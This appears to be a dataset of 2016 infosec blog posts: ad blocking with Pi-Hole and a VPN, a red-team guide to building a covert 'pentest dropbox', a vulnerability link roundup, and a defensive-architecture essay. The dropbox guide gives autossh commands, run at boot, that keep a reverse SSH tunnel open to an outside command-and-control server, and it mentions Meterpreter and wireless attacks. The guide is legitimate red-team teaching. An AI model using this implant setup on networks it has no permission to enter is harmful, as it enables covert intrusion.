suspicions confirmed when I see an article about just how many of those ads are in fact distributing malware.\n\nhttps://www.proofpoint.com/us/threat-insight/post/massive-adgholas-malvertising-campaigns-use-steganography-and-file-whitelisting-to-hide-in-plain-sight\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Block Ads on All Your Devices\"\nTaxonomies: \"Author, Ethan Robish, General InfoSec Tips & Tricks, InfoSec 201, adblock, malvertising, VPN\"\nCreation Date: \"Mon, 01 Aug 2016 17:22:37 +0000\"\nEthan Robish //\n\nAds serve an important function on the internet.  For many websites, ads are the main form of revenue that funds the site\u2019s content or service.  This, however, doesn't prevent them from annoying users, taking up bandwidth, or even being malicious.  They can completely hijack the page you are viewing with popups and scare tactics.  You, as a savvy security blog reader, know better than to \u201cclick to remove virus\u201d or believe that your phone is out of memory and needs fixing.  But can you say the same for your spouse, your children, or your parents?\n\n Nightmare Material \n\nLike many of you, I use an ad block extension in my browser.  It's one of the first things I install with a new browser.  However, it's not perfect.  Each browser on each device needs its own extension, which takes up valuable resources, and some browsers don't support extensions.  In a world where people own multiple desktops, laptops, media devices, tablets, and phones this quickly becomes unmanageable.\n\nHome Ad Blocking Solution - DNS Server\n\nOne solution is to prevent contacting ad domains in the first place using DNS.  In fact, Security Weekly covered this exact scenario in a tech segment.\n\nhttps://www.youtube.com/watch?v=79-nOS2zgIY\n\nWhile I can appreciate Paul wanting to set up and manage his own DHCP and DNS servers, I wanted a more hands-off approach.\n\nIf you want a super simple solution, I recommend signing up for a free OpenDNS account.  From there you configure which categories you'd like to block, change your DNS settings on your home network, and you're done.\n\nhttps://signup.opendns.com/homefree/\n\nBut the solution I decided on was mentioned by the guys at Security Weekly in their very next episode.  The solution is called Pi-Hole.\n\nhttps://www.youtube.com/watch?v=T5XTENPitx0\n\nIt can be installed on a RaspberryPi and comes with a DNS server pre-configured to block over 100,000 ad-related domains.  The installation script assumes you're running Debian, so you don't necessarily need a RaspberryPi to use it.\n\nhttps://pi-hole.net/\n\nIf you're putting this on a fresh RaspberryPi, I recommend going with the Raspbian Lite image and following the instructions on Pi-Hole's website.\n\nhttps://www.raspberrypi.org/downloads/raspbian/\n\nOr you can use the one-click installer that comes with the DietPi Linux distro.\n\nhttp://dietpi.com/\n\nOnce installed, I switched the DHCP DNS servers on my home router to point to my new Pi-Hole IP address.  From then on, any time a device on my home network gets an IP via DHCP, they also get the benefit of ad blocking through the Pi-Hole DNS.\n\nThrough Pi-Hole's web interface you can add custom sites to blacklist or whitelist.  Consider whitelisting sites you trust and wish to support.  You may also need to whitelist certain domains if you notice that your devices aren't behaving as expected.\n\nAfter I got this running on my home network, I felt a sense of accomplishment in that I had protected my laptop, my phone, and even my wife's devices in one fell swoop.  It wasn't long, however, before I left the safety of my home network and ventured out into the world.  The primary place I noticed was on my phone, both browsing the web and opening free ad-based apps.  We can do better.\n\n Ad Traffic Hovers at 10-15% Daily \n\nRemote Ad Blocking Solution - VPN\n\nThe next part of my solution involved setting up a home VPN that I could connect when away from home.  While searching, I ran across the SoftEther project.  It's open-source, cross-platform, and supports numerous protocols.\n\nI roughly followed this guide to set up and configure the SoftEther server on my Raspberry Pi.\n\nhttps://tomearp.blogspot.com/2013/11/setting-up-l2tpipsec-vpn-with-softether.html\n\nYou\u2019ll need to allow the correct ports through your router and have a public IP or domain you can use to connect while you\u2019re away from home.  I took advantage of SoftEther\u2019s free dynamic DNS service.  Your port list may vary based on which VPN protocol(s) you decided to use.  For L2TP/IPSec, I had to forward UDP ports 500 and 4500 along with enabling the IPSec and L2TP passthrough options on my router.\n\nAfter that, it was a matter of configuring my laptop and phone with the correct client VPN profiles.  More details can be found on SoftEther's website, but if you've ever set up a VPN on your device before this should be straightforward.\n\nMobile Devices - https://www.softether.org/4-docs/2-howto/3.VPN_for_Mobile/1.iPhone_and_Android\n\nMac OSX - https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/5.Mac_OS_X_L2TP_Client_Setup\n\nWindows - https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/4.Windows_L2TP_Client_Setup\n\nNow, when I'm away from home all I have to do is start up my VPN connection.  Not only is my traffic encrypted, but ads are blocked too!  This also helps cut down on data usage since the ads won't be transferred over the connection.\n\nEthan Robish //\nAds serve an important function on the internet.  For many websites, ads are the main form of revenue that funds the site\u2019s content or service.  This, however, doesn't prevent them from annoying users, taking up bandwidth, or even being malicious.  They can completely hijack the page you are viewing with popups and scare tactics.  You, as a savvy security blog reader, know better than to \u201cclick to remove virus\u201d or believe that your phone is out of memory and needs fixing.  But can you say the same for your spouse, your children, or your parents?\n\nNightmare Material\nLike many of you, I use an ad block extension in my browser.  It's one of the first things I install with a new browser.  However, it's not perfect.  Each browser on each device needs it's own extension, which takes up valuable resources, and some browsers don't support extensions.  In a world where people own multiple desktops, laptops, media devices, tablets, and phones this quickly becomes unmanageable.\nHome Ad Blocking Solution - DNS Server\nOne solution is to prevent contacting ad domains in the first place using DNS.  In fact, Security Weekly covered this exact scenario in a tech segment.\nhttps://www.youtube.com/watch?v=79-nOS2zgIY\nWhile I can appreciate Paul wanting to set up and manage his own DHCP and DNS servers, I wanted a more hands-off approach.\nIf you want a super simple solution, I recommend signing up for a free OpenDNS account.  From there you configure which categories you'd like to block, change your DNS settings on your home network, and you're done.\nhttps://signup.opendns.com/homefree/ \nBut the solution I decided on was mentioned by the guys at Security Weekly in their very next episode.  The solution is called Pi-Hole.\nhttps://www.youtube.com/watch?v=T5XTENPitx0\nIt can be installed on a RaspberryPi and comes with a DNS server preconfigured to block over 100,000 ad-related domains.  The installation script assumes you're running Debian, so you don't necessarily need a RaspberryPi to use it.\nhttps://pi-hole.net/\n[embed]https://www.youtube.com/watch?v=TzFLJqUeirA[/embed]\nIf you're putting this on a fresh RaspberryPi, I recommend going with the Raspbian Lite image and following the instructions on Pi-Hole's website.\nhttps://www.raspberrypi.org/downloads/raspbian/\nOr you can use the one-click installer that comes with the DietPi linux distro.\nhttp://dietpi.com/\nOnce installed, I switched the DHCP DNS servers on my home router to point to my new Pi-Hole IP address.  From then on, any time a device on my home network gets an IP via DHCP, they also get the benefit of ad blocking through the Pi-Hole DNS.\nThrough Pi-Hole's web interface you can add custom sites to blacklist or whitelist.  Consider whitelisting sites you trust and wish to support.  You may also need to whitelist certain domains if you notice that your devices aren't behaving as expected.\nAfter I got this running on my home network, I felt a sense of accomplishment in that I had protected my laptop, my phone, and even my wife's devices in one fell swoop.  It wasn't long, however, before I left the safety of my home network and ventured out into the world.  The primary place I noticed was on my phone, both browsing the web and opening free ad-based apps.  We can do better.\n\nAd Traffic Hovers at 10-15% Daily\nRemote Ad Blocking Solution - VPN\nThe next part of my solution involved setting up a home VPN that I could connect when away from home.  While searching, I ran across the SoftEther project.  It's open source, cross-platform, and supports numerous protocols.\nI roughly followed this guide to set up and configure the SoftEther server on my Raspberry Pi.\nhttps://tomearp.blogspot.com/2013/11/setting-up-l2tpipsec-vpn-with-softether.html\nYou\u2019ll need to allow the correct ports through your router and have an public IP or domain you can use to connect while you\u2019re away from home.  I took advantage of SoftEther\u2019s free dynamic DNS service.  Your port list may vary based on which VPN protocol(s) you decided to use.  For L2TP/IPSec, I had to forward UDP ports 500 and 4500 along with enabling the IPSec and L2TP passthrough options on my router.\nAfter that, it was a matter of configuring my laptop and phone with the correct client VPN profiles.  More details can be found on SoftEther's website, but if you've ever set up a VPN on your device before this should be straightforward.\n\nMobile Devices - https://www.softether.org/4-docs/2-howto/3.VPN_for_Mobile/1.iPhone_and_Android\nMac OSX - https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/5.Mac_OS_X_L2TP_Client_Setup\nWindows - https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/4.Windows_L2TP_Client_Setup\n\nNow, when I'm away from home all I have to do is start up my VPN connection.  Not only is my traffic encrypted, but ads are blocked too!  This also helps cut down on data usage since the ads won't be transferred over the connection.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build Your Own Penetration Testing Drop Box\"\nTaxonomies: \"Author, Beau Bullock, Red Team, Red Team Tools, Beau Bullock, build your own, hardware hacking, pen-testing, red teaming\"\nCreation Date: \"Wed, 03 Aug 2016 12:55:08 +0000\"\nBeau Bullock //\n\nTL;DR\n\nI compared three single-board computers (SBC) against each other with a specific goal of finding which one would serve best as a \u201cpenetration testing dropbox\u201d, and maintain an overall price of around $110. Spoiler Alert: At the time I tested these Hardkernel\u2019s ODROID-C2 absolutely destroyed the competition in this space. If you want to skip the SBC comparison and jump right to building your own pentest dropbox you can find the instructions below and also here.\n\nOverview\n\nA few weeks ago I was scheduled for an upcoming Red Team exercise for a retail organization. In preparation for that assessment, I started gathering all the gear I might need to properly infiltrate the organization, and gain access to their network. Social engineering attacks were explicitly removed from the scope for this engagement. This meant I wasn\u2019t going to be able to ask any employees to plug in USB devices, let me in certain rooms, or allow me to \u201ccheck my email\u201d on their terminals (yes this works).\n\nEssentially, what we're left at that point were physical attacks. Could I get access to a terminal left unlocked and perform an HID-based (think Rubber Ducky) attack? If the system wasn\u2019t unlocked, perhaps a USB-Ethernet adapter (like the LAN Turtle) could be placed in line with the system to give me a remote shell to work from. Even if I could get physical access, without any prior knowledge of the network\u2019s egress filtering setup, was I going to be able to get a shell out of the network? So this led me down the path of building a pentest dropbox that I could place on a network, could command over a wireless adapter, automatically SSH out of a network, and just be an all-around pentesting box.\n\nSome Device Requirements\n\nLooking into the available options already out there it is very clear that I could either spend over $1,000 to buy something that did what I needed it to do or try to build one comparable for significantly cheaper. So I set some very specific goals of what I wanted this device to do. Here they are:\n\nDevice has to be relatively unnoticeable in size (could be plugged in under a desk unnoticed)\n\nHas to be able to be controlled over a wireless interface (bonus points if multiple wireless interfaces can be used so wireless management and wireless attacks can happen concurrently)\n\nPersistent reverse SSH tunnel to a command and control server\n\nFully functional pentesting OS (not just a shell to route attacks through)\n\nDecent storage space (32-64GB)\n\nActually be a usable pentesting box that is not sluggish due to hardware restrictions\n\nCost around $110 total to build\n\nA Look At the Hardware\n\nI bought three of the most popular single-board computers (SBC) to try to find out which one would be the perfect fit for a pentest dropbox that could accomplish my goals. The devices I put to the test are as follows:\n\nRaspberry Pi 3 Model B\n\nBeagleBone Black\n\nHardkernel ODROID-C2\n\n Left to Right: The BeagleBone Black, Raspberry Pi 3 Model B, and the ODROID-C2  \n\nLet\u2019s take a look at the hardware specifications of these devices first.\n\nGiven the chart above, the ODROID-C2 has the others beat in the Processor, GPU, RAM, Ethernet speed, and Video categories, not to mention the ability to install an eMMC storage module instead of running off of a microSD card. The BeagleBone Black (BBB) has 4GB of onboard flash storage, and more I/O and peripheral options. The Pi 3 does have a built-in Wireless adapter and costs less than the C2 or BBB. Even though the scale was already tipping in the direction of the ODROID-C2 I still gave each device equal treatment in terms of testing them out as pentest drop boxes.\n\nIn each case, I bought additional items to complete each system. I found relatively inexpensive cases for the boards, power supplies, storage cards, and wireless adapters where necessary. The BBB and Pi 3 only support the ability to use a microSD card as storage where the ODROID-C2 supports microSD and eMMC. So in the case of the ODROID-C2, I actually tested both storage mediums.\n\n Raspberry Pi 3 with microSD Card, and ODROID-C2 with eMMC Module \n\nOperating System\n\nI\u2019m a fan of Kali Linux. I use it on pretty much every pentest I perform. Along with the desktop versions of their distribution they also provide images for a number of ARM devices. Each of the devices I compared has Kali images available for them here.\n\nOne could definitely substitute a distribution of choice for their own pentest dropbox but I found Kali very easy to install, and familiar given my history with it. In each case, it\u2019s as simple as writing the image file to an external storage medium like a microSD or in the case of the ODROID-C2 an eMMC module then attaching it to the device and booting it up.\n\nWireless\n\nThe Raspberry Pi 3 conveniently has a built-in wireless card. The problem with it is that it doesn\u2019t support monitor mode or packet injection. While yes this card can still be used as an access point, which satisfies the goal of managing the device over WiFI, it is unable to perform any wireless attacks.\n\nI found this relatively inexpensive ($11.99) wireless adapter that does everything I would want it to. This adapter has an RT5370 chipset that supports monitor mode and worked perfectly when injecting packets with Aireplay-ng. \n\n RT5370 Chipset Wireless Adapter \n\nNeither the BBB nor the C2 includes wireless chips on the devices themselves so a USB wireless adapter was required for them. I used the above adapter along with Hostapd to set up an access point (I include a full walkthrough on setting this up at the end) I could connect to in order to manage the device without physically being connected to it. This adapter works with the Pi 3 as well. If you want to perform any wireless attacks with the dropbox, and opt for the Pi 3, I recommend this adapter.\n\nCases and Overall Look\n\nFor the BeagleBone Black, I bought this black case. I noticed that the device was heating up a bit during heavy testing. For the other two devices, I opted for a case that included a case fan.\n\n ODROID-C2 Case With Fan \n\nThe ODROID-C2 actually doesn\u2019t have very many options available in terms of cases. However, the ODROID-C2 is almost an exact replica of the Raspberry Pi 3 in terms of where ports are located on the device. So pretty much any Pi 3 case should work for it (with one small exception that you will see momentarily). For both the Pi 3 and the ODROID-C2 I used this Performance Pro Case. This case includes a case fan that is powered by two of the GPIO pins located on the boards.\n\nThere is one problem that comes from using a Raspberry Pi case for an ODROID-C2: the power supply socket is the only thing that doesn\u2019t match up perfectly. This is a problem that can easily be solved with a drill.\n\n After drilling the hole in the case, the power adapter fits just fine.  \n\n The three devices in their cases. \n\nTotal Hardware Costs\n\nI decided to test each device with a 64 GB SanDisk Extreme MicroSDXC UHS-1 card. This storage amount was something that I personally wanted to have but if you don\u2019t need as much storage you can definitely drop the total price by going with lower storage space. I also tested out an eMMC module for the ODROID-C2. I only tested a 32 GB eMMC module due to the cost being so much higher. You will see later on in this post that the cost is very much worth it. Again, the wireless card for the Pi 3 is not completely necessary due to the built-in card but if you want to do any wireless attacks you will need an adapter.\n\nField Testing the Drop Boxes\n\nAfter getting each device setup with my initial requirements of what I wanted from a pentest dropbox I performed a few tests to compare how well they actually function as a dropbox. I first tested how fast each system could boot up. To do this I timed from the moment I hit enter after typing \u2018reboot\u2019 in a terminal to the moment when the login screen was displayed. I also tested how fast from a reboot I could load the Metasploit console. The ODROID-C2 took 1 minute and 14 seconds from reboot to Metasploit console. This was a full minute faster than the Raspberry Pi 3, and over 2 minutes faster than the BeagleBone Black.\n\nNext, I baselined password cracking speeds on the devices. Granted, I don\u2019t think I would ever have a need or really want to do any cracking on these. I have a decent cracking rig I could always send hashes to. This was more a test of the processors in each of them so that I could have a number to visually see which one was operating faster. To do this I simply used the baseline test functionality from John the Ripper (./john --test). Again, the ODROID-C2 came out on top, and by a lot.\n\nI performed port scans with each device using Nmap against a router. I tested both the standard Nmap command without any flags and also with the Service Detection flag (-sV). There really wasn\u2019t a huge difference between the devices during this test. They all took around 2 seconds for the basic scan and around 2 minutes and 23 seconds for the Service Detection.\n\nThe last comparison I did between the devices was to see how fast each of them could write data to storage, and read data from storage. To do this I first used \u2018dd\u2019 to write 1 GB of data to disk. Then, I cleared the Linux cache and read the file again using \u2018dd\u2019. I also tested buffered and cached reads using \u2018hdparm\u2019. When it comes to disk reads and writes this is where the ODROID-C2 absolutely destroys the competition. The ODROID-C2 with the eMMC module is about 15 times faster at writing to disk than the Raspberry Pi 3 with microSD and about 9 times faster at reading data. Even the ODROID-C2 with microSD is still about 2 times faster than the Raspberry Pi 3.\n\nFor testing write speeds I used this:\n\nsync; dd if=/dev/zero of=tempfile bs=1M count=1024; sync\n\nFor testing read speeds I used this:\n\n/sbin/sysctl -w vm.drop_caches=3\ndd if=tempfile of=/dev/null bs=1M count 1024\n\nFor testing buffered and cached reads I used this:\n\nhdparm -Tt /dev/mmcblk0\n\nConclusion\n\nThe ODROID-C2 was a much faster and stable build as a pentest dropbox. I ended up taking that device with me on the red team engagement, placed it in a location connected to their network and left it up for three days without a hiccup. The wireless interface saved me, as the network I was plugged into wasn\u2019t set up to hand out DHCP addresses to new devices. I had to manually discover what the subnet was and manually set an IP address to use to route my traffic. If I didn\u2019t have the wireless interface the device would have simply been sitting there not able to connect out to my command and control server.\n\nThe ODROID-C2 kept an SSH tunnel to my C2 server up after I set up the interface. The device handled multiple Meterpreter sessions perfectly and felt as if I had a very decent penetration testing system on their network. The other devices were usable but for about the same price you can build a much more powerful dropbox.\n\nBelow you will find a full walkthrough guide to build an ODROID-C2 pentest dropbox w/ eMMC yourself. But if you read this and already have one of the other devices or just feel like building a dropbox out of one of the other devices, I have written up instructions for each. You can find PDF\u2019s of each write-up here:\n\nODROID-C2 w/ eMMC Pentest DropBox Instructions\n\nODROID-C2 w/ microSD Pentest DropBox Instructions\n\nRaspberry Pi 3 Pentest DropBox Instructions\n\nBeagleBone Black Pentest DropBox Instructions\n\nWithout further ado here is the full walkthrough guide for building the ODROID-C2 Pentest DropBox with an eMMC module:\n\nODROID-C2 w/ eMMC Pentest DropBox Instructions\n\nHardware Shopping List (links current as of 8/2/2016)\n\nODroid-C2 - $41.95\n\nDC 5V/2A 2.5 mm power adapter - $6.99\n\n32 GB eMMC module for ODROID-C2 (make sure the eMMC to MicroSD adapter is selected as an add-on $1) - $42.95\n\nMicroSD to USB Adapter - $6.99\n\nRT5370 Chipset Wireless Antenna - $11.99\n\nPerformance Pro Case for RPi - $9.99\n\nInitial Setup of the Kali Image\n\nDownload the Kali ODROID-C2 image from the Kali downloads site here: \n\nFlash the Kali image to the eMMC.\n\nFor Windows\n\nUse an eMMC to microSD adapter, then microSD to USB adapter and connect the eMMC to the Windows system.\n\nOn a Windows system unzip the kali-*-odroidc2.img.xz file with 7zip\n\nUse Win32DiskImager to write the Kali image to the eMMC.\n\nFor Linux\n\nUse an eMMC to microSD adapter, then microSD to USB Adapter and connect the eMMC to the Linux system.\n\n Use the dd tool to image the Kali file to the eMMC (It is very important that you choose the correct storage device here. It is very easy to accidentally wipe out your computers hard disk using this command. In the example below I use /dev/sdb but yours may be different so change accordingly.)\n\nxzcat kali-*-odroidc2.img.xz | dd of=/dev/sdb bs=512k\n\nFix eMMC reboot Issue (For some reason the uInitrd file in the boot partition gets corrupted after rebooting. This is a known issue and is documented here: https://github.com/offensive-security/kali-arm-build-scripts/issues/76. The steps below are a workaround that seems to fix this issue for now.)\n\nWhile eMMC is still plugged into system copy off the /boot partition (Image, meson64_odroidc2.dtb, and uInitrd).\n\nCreate a \u201cbackup\u201d folder in the /boot partition and copy these files there (Image, meson64_odroidc2.dtb, and uInitrd).\n\nInsert the eMMC card into the ODROID-C2 and boot it up using the power supply, an HDMI cable for display, and keyboard/mouse plugged into the USB ports.\n\nLogin to the Kali Linux distribution with the username of \u2018root\u2019 and the password of \u2018toor\u2019.\n\nMount the boot partition and also make it auto mount on start up using /etc/fstab.\n\nmount /dev/mmcblk0p1 /boot\n\necho '/dev/mmcblk0p1 /boot auto defaults 0 0' >> /etc/fstab\n\nCreate the backup restore script.\n\nnano /boot/backup/restore.sh\n\nCopy the following into /boot/backup/restore.sh\n\n#!/bin/bash\n\ncp /boot/backup/* /boot/\n\nMake the script executable and make sure it runs without error.\n\nchmod 755 /boot/backup/restore.sh\n\n/boot/backup/restore.sh\n\nAdd the script to the rc.local.\n\nnano /etc/rc.local\n\nAdd the following line before \u2018exit 0\u2019.\n\n/boot/backup/restore.sh\n\nPlug an Ethernet cable into the ODROID-C2 to provide Internet to the device. The ODROID-C2 should automatically attempt to obtain an IP address via DHCP.\n\nChange the root password. This can be accomplished by opening up a terminal and typing \u2018passwd\u2019 then hitting \u2018enter\u2019. Follow the dialog to change the password.\n\npasswd\n\nExpand the filesystem to cover the entire eMMC. (When the image is flashed to the eMMC it only partitions a portion of the eMMC. You must manually recreate the partition using the below fdisk commands to expand the drive. Run \u2018df \u2013H\u2019 before and after to see the difference in the root partition\u2019s available space)\n\nfdisk /dev/mmcblk0\n\nd           ###The \u2018d\u2019 option allows us to delete a partition\n\n2           ###We select partition 2 to be deleted\n\nn           ###The \u2018n\u2019 option creates a new partition\n\np           ###\u2019p\u2019 creates a primary partition\n\n2           ###Set partition number 2\n\nAccept default First sector   ###The start sector of the disk\n\nAccept default Last sector    ###The end sector of the disk\n\nw                             ###Use \u2018w\u2019 to write the changes\n\nreboot                        ###reboot, then log back in\n\nresize2fs /dev/mmcblk0p2 ###Use resize2fs to grow the partition\n\nUpdate and upgrade the Kali distribution.\n\napt-get update && upgrade\n\nSetup a WiFi Access Point\n\nInstall hostapd.\n\napt-get install hostapd\n\nCreate the file /etc/hostapd/hostapd.conf. This can be accomplished with the \u2018nano\u2019 command.\n\nnano /etc/hostapd/hostapd.conf\n\nCopy the following into the hostapd.conf file. Modify the ssid, and wpa_passphrase accordingly.\n\n# Interface configuration\n\ninterface=wlan0\n\nssid=tortugas\n\nchannel=1\n\n \n\n# WPA configuration\n\nmacaddr_acl=0\n\nauth_algs=3\n\nignore_broadcast_ssid=0\n\nwpa=3\n\nwpa_passphrase=@pirateslife4me@\n\nwpa_key_mgmt=WPA-PSK\n\nwpa_pairwise=CCMP TKIP\n\nrsn_pairwise=CCMP\n\n \n\n# Hardware configuration\n\ndriver=nl80211\n\nieee80211n=1\n\nhw_mode=g\n\nModify the file /etc/init.d/hostapd.\n\nnano /etc/init.d/hostapd\n\nFind the line:\n\nDAEMON_CONF=\n\nAnd change it to:\n\nDAEMON_CONF=/etc/hostapd/hostapd.conf\n\nInstall Dnsmasq.\n\napt-get install dnsmasq\n\nEdit /etc/dnsmasq.conf.\n\nnano /etc/dnsmasq.conf\n\nAdd the following to /etc/dnsmasq.conf (This will specify dnsmasq to bind to the wlan0 interface and provide DHCP to clients. The range specified below will hand out IP\u2019s in the 172.16.66.50-172.16.66.100 range):\n\nno-resolv\n\n# Interface to bind to\n\ninterface=wlan0\n\nbind-interfaces\n\n# Specify starting_range,end_range,lease_time\n\ndhcp-range=172.16.66.50,172.16.66.100,255.255.255.0,12h\n\nEdit /etc/network/interfaces.\n\nnano /etc/network/interfaces\n\nAdd the following to /etc/network/interfaces (This will specify a static IP of 172.16.66.1 for the wlan0 interface).\n\nauto wlan0\n\nallow-hotplug wlan0\n\niface wlan0 inet static\n\naddress 172.16.66.1\n\nnetmask 255.255.255.0\n\nAt this point plug in the Wireless adapter, and attempt to bring up the interface.\n\nairmon-ng check kill\n\nhostapd /etc/hostapd/hostapd.conf\n\nIf there are no errors you should now be able to connect to the SSID with a wireless device.\n\nEnable hostapd to start on boot.\n\nupdate-rc.d hostapd enable\n\nEnable dnsmasq to start on boot. (I had issues with \u201cupdate-rc.d dnsmasq enable\u201d here because dnsmasq was starting before wlan0 was up and failing to bind to the interface. Instead, I found adding \u201cservice dnsmasq start\u201d to /etc/rc.local works.\n\nnano /etc/rc.local\n\nAdd the following line to /etc/rc.local before \u2018exit 0\u2019:\n\nservice dnsmasq start\n\nSetup Automatic Reverse SSH Tunnel\n\nThis section assumes you have a command and control server accessible on the Internet and that server has SSH enabled on port 22.\n\nInstall \u2018autossh\u2019 to use to automatically create an SSH tunnel to a command and control server.\n\napt-get install autossh\n\nGenerate SSH keys.\n\nssh-keygen\n\n#Leave all of the settings default\n\nCopy /root/.ssh/id_rsa.pub to the C2 server.\n\nscp /root/.ssh/id_rsa.pub root@:\n/directory/to/upload/to/\n\nAppend the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server.\n\n# On C2 server\n\ncat /directory/to/upload/to/id_rsa.pub >> \n~/.ssh/authorized_keys\n\nTest the key-based authentication. If all goes well you should end up logged into the C2 server without the requirement of entering a password.\n\n# On the ODROID-C2\n\nssh root@\n\nTest \u2018autossh\u2019.\n\nautossh -M 11166 -o \u201cPubkeyAuthentication=yes\u201d -o \n\u201cPasswordAuthentication=no\u201d -i /root/.ssh/id_rsa -R 6667:\nlocalhost:22 root@\n\nIf all goes well an ssh session should be established, and port 6667 should now be listening on the C2 server. On the C2 server SSH\u2019ing to this port should provide an SSH shell to the ODROID-C2. The -M option (11166) is a monitor port.\n\nAdd the \u2018autossh\u2019 command to /etc/rc.local to establish the SSH tunnel at boot.\n\nnano /etc/rc.local\n\nAdd the following to /etc/rc.local\n\nautossh -M 11166 -N -f -o \u201cPubkeyAuthentication=yes\u201d -o \n\u201cPasswordAuthentication=no\u201d -i /root/.ssh/id_rsa -R 6667:\nlocalhost:22 root@ &\n\nFlag meanings:\n\n-N: Do not execute a command on the middleman machine\n\n-f: drop in the background\n\n&: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot.\n\nFinal Touches\n\nSome tools are pre-installed on the Kali ARM image but not many (sqlmap, wireshark, nmap, hydra, john, aircrack-ng are installed by default)\n\nInstall whatever tools you want to have on your dropbox. Here are some to get you started:\n\napt-get install responder metasploit-framework macchanger \nvoiphopper snmpcheck onesixtyone patator isr-evilgrade \ncreddump screen\n\nTo go into \u201cWireless attack\u201d mode instead of using the card as an access point follow these instructions:\n\nservice hostapd stop\n\nairmon-ng check kill\n\nairmon-ng start wlan0\n\nairodump-ng wlan0mon ### Or any other wireless attack toolkit\u2026\n\nOptionally, it is possible to connect a second wireless card to use as the \u201cattack\u201d interface.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Lawrence's List 080516\"\nTaxonomies: \"InfoSec 101, News, browser holes, development, Felony, more security, Pwn2Own, Software engineer, trend micro, venmo\"\nCreation Date: \"Fri, 05 Aug 2016 16:38:53 +0000\"\nLawrence Hoffman //\n\nWith BlackHat and DefCon happening as I type it\u2019s hard to choose what\u2019s going to make this list. I will probably save most of the big shiny new wrap ups for next week after I\u2019ve had a chance to review some of what those two conventions produced. Until there here\u2019s a few articles and a project that I found interesting this week.\n\nAs a software engineer it is important to always have in mind \u201cwhat level of authentication is required to perform this action.\u201d Failure to do so often results in some pretty big problems. As we saw with the court case between Apple and the FBI the iPhone has some pretty sophisticated security features. Unfortunately it also has some nifty ease of use features. By themselves these features are often helpful, and not a real security threat of any kind. However, when combined they sometimes lead to real problems. As is the case with Venmo, an app that allows users to send and receive money with other Venmo users. They implemented a feature to allow notification and authorization via text message, due to the fact that iPhone displays text messages on the lock screen, and Siri can send texts when the phone is locked\u2026 bam, money can be stolen.\n\nhttp://www.martinvigo.com/steal-2999-99-minute-venmo-siri/\n\nI like this next article because he just has a solid point. Many developers will install local copies of the tools they use to handle their backend data on a their workstation for testing code they\u2019re working on locally. The fact that many of these tools come either built-in or add-on web interfaces, which developers find extremely handy for checking the state of the database during development and therefore often have installed, leads to a possible vulnerability when surfing about the web. It might be worthwhile to note that the attacks described here rely on HTTP 0.9 and DNS rebinding, both of which will be very hard to pull off in Chrome, impossible if the browser is the Chrome-nightly build as support for HTTP 0.9 was removed and DNS rebinding was made very difficult if not impossible in a recent bug fix.\n\nhttp://bouk.co/blog/hacking-developers/\n\nFollowing up on March\u2019s Pwn2Own the Trend Micro\u2019s Zero Day Initiative research team has issued a 65 page PDF which details the winning entries in the contest. This paper paints a picture of browser technology still full of security holes. There are some really great vulnerabilities in here and nice walk-through of the logic of how these things work.\n\nhttp://documents.trendmicro.com/assets/pdf/shell-on-earth.pdf\n\nIn keeping with my recent pattern I decided to add a project I\u2019m looking into. This week it\u2019s Felony. I\u2019ve had a fair share of people tell me that they don\u2019t regularly use crypto because it\u2019s difficult. Here they\u2019re probably referring to the GnuPG command line interface which can be a bit steep if you don\u2019t have any understanding of how public key cryptography is meant to function. Fortunately there are folks out there who are trying to remedy this situation. Felony gives a nice front-end to GnuPG, it allows use of the system through the native-ish windowing systems folks are used to. That\u2019s a good thing.\n\nhttps://github.com/henryboldi/felony\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Are You InfoSec Synced?\"\nTaxonomies: \"Author, InfoSec 101, Joff Thyer, business departments, defensive security, infosec, infosec design\"\nCreation Date: \"Mon, 08 Aug 2016 15:22:33 +0000\"\nJoff Thyer //\n\nOne of my observations over time in the Information Security market is that the vendors seem to want to solve challenges with appliance point solutions.  It is perfectly understandable that people want a piece of the fiscal pie and makes a healthy living, but in today\u2019s threat environment this approach is failing.\n\nMature organizations are naturally looking for solutions because they know from their metrics, and their security operations programs that things are not as healthy as they would like.  They are tired of solutions that link their security operations people to a firehose of mostly irrelevant data.  In a lot of cases, paying your most talented security analysts more money to keep their eyes glued and focused on log pattern analysis will yield better results than all of the flashy graphics of ten solutions combined.\n\nIn the industry, it is beyond time for us to insist on security solutions that cross communicate and form a peer partnership / combined strategy.  In addition, it is too easy to get carried away by the glowing silver bullet like solutions and forget our security 101\u2019s.  For example:\n\nDo you have an inventory of your hardware assets?\n\nDo you have an inventory of your software assets?\n\nAre you logging centrally?\n\nDo you have good change management control, and metrics?\n\nMore to the point, security threats are evolving quickly beyond the appliance solution space. There will not be a single solution that exclusively watches the endpoint and yields the result you are looking for. Solutions will have to adapt to a behavior-based approach and be able to take in data from multiple perspectives in a computing environment, from the endpoint to the network and to the various perimeters.\n\nIt is high time that organizations start the process of micro-level communications segmentation driven by the rich software based directory structure most environments have and further enabled by interlocking endpoint firewall and network segmentation solutions.  It is high time for all of our software in a sophisticated computing environment to cooperate closely, examine heuristics, behaviors, and enforce only legitimate communications.\n\n A great one for XKCD \n\nWhat do I mean?  As an example, what if we have a finance department with Windows 10 deployed desktops.  This department users office productivity applications, print, and email.  In the context of this example, security professional interests in properly architecting and designing for error detection and correction should be:\n\nEnforce communications from the finance systems to needed server resources and print resources.\n\nPrevent direct peer communications between finance and engineering departments for example.\n\nLockdown the application runtime environment. It is predictable and controllable in the business context.\n\nProvide whitelisted Internet web resources that finance can connect to, or at minimum enforce categorization of resources through perimeter proxies.\n\nUpon network connection, use network access control software to properly enforce a \u201cfinance\u201d communications profile.\n\nEmploy a belt and suspenders approach by doubling down on the communications enforcement with Windows endpoint firewall configuration.\n\nLog all event information to a central log source\n\nLog any/all exceptions that deviate from the deployed communications profile and chase them down in an incident response process.\n\nIn short, we all must stop thinking in terms of organizational silos and 